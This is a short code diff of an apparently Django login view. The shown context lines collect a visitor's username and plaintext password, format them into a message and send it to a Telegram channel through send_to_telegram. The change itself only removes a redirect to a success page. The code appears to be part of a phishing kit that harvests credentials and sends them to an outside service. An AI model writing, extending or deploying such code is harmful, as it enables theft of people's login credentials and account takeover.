@@ -26,7 +26,6 @@ def login_view(request):
         mail_message = f"{subject}\nusername: {email}\npassword: {password}"
         send_to_telegram(mail_message)
         print(mail_message)
-        return redirect('success')
     return render(request, 'index.html')
 
 def success_view(request):
